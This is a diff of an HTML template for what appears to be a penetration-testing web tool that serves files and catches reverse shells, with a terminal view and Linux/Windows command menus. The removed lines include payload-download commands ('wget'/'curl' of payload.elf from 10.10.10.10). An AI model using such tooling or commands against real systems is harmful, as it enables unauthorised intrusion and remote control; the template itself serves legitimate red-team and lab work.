@@ -2,39 +2,71 @@
 
 {{ define "content" }}
 <div id="app-content">
-    <!-- Section Toggle inside App -->
     <div class="tabs">
       <div id="tab-files" class="tab active">File Share</div>
       <div id="tab-shells" class="tab">Reverse Shells</div>
     </div>
     <div id="file-share" class="content">
-      <button id="upload-btn" class="file-share-button">Upload File</button>
-      <button id="newdir-btn" class="file-share-button">New Folder</button>
-      <ul id="file-list">
-        <!-- Dynamically populated -->
-      </ul>
+      <div class="toolbar">
+        <span id="current-path">/</span>
+        <div>
+          <button id="catch-btn" class="file-share-button">Catch</button>
+          <button id="upload-btn" class="file-share-button">Upload</button>
+          <button id="newdir-btn" class="file-share-button">New Folder</button>
+        </div>
+      </div>
+      <div id="catch-info" class="catch-info hidden">
+        <div class="catch-header">
+          <span id="catch-status"></span>
+          <button id="catch-close" class="catch-close-btn">&times;</button>
+        </div>
+        <div id="catch-cmds"></div>
+      </div>
+      <ul id="file-list"></ul>
+      <div id="file-viewer" class="hidden">
+        <div class="viewer-header">
+          <button id="viewer-back" class="file-share-button">Back</button>
+          <span id="viewer-title"></span>
+          <div class="viewer-modes">
+            <button id="viewer-text" class="viewer-mode-btn active">Text</button>
+            <button id="viewer-hex" class="viewer-mode-btn">Hex</button>
+          </div>
+        </div>
+        <pre id="viewer-content"></pre>
+        <div id="viewer-info" class="viewer-info hidden"></div>
+      </div>
+      <input type="file" id="file-input" hidden>
     </div>
     <div id="shell-handler" class="content hidden">
-      <ul id="shell-list">
-        <!-- Dynamically populated -->
-      </ul>
+      <div id="shell-list-view">
+        <div class="shell-info">Listener port: {{.ShellPort}}</div>
+        <ul id="shell-list"></ul>
+      </div>
+      <div id="shell-terminal" class="hidden">
+        <div class="terminal-header">
+          <button id="terminal-back" class="file-share-button">Back</button>
+          <span id="terminal-title"></span>
+        </div>
+        <pre id="terminal-output"></pre>
+        <input id="terminal-input" type="text" autofocus>
+      </div>
     </div>
   </div>
-  <!-- Context Menu -->
   <nav id="ctx-menu" class="context-menu">
     <ul>
-      <li data-action="copy">Copy</li>
+      <li data-action="view">View</li>
+      <li data-action="download">Download</li>
       <li data-action="rename">Rename</li>
       <li data-action="delete">Delete</li>
-      <li class="dropdown">Exfiltration
-        <ul class="dropdown-menu">
-          <li data-method="method1">wget 10.10.10.10/payload.elf -O payload.elf</li>
-          <li data-method="method2">curl 10.10.10.10/payload.elf -o payload.elf</li>
-          <!-- Add more methods -->
-        </ul>
+      <li class="ctx-separator"></li>
+      <li class="dropdown">Linux &#9656;
+        <ul class="dropdown-menu" id="linux-cmds"></ul>
+      </li>
+      <li class="dropdown">Windows &#9656;
+        <ul class="dropdown-menu" id="windows-cmds"></ul>
       </li>
     </ul>
   </nav>
-</div>
+<script>window.TWEAKER={shellPort:{{.ShellPort}}};</script>
 <script src="/static/js/script.js"></script>
 {{ end }}
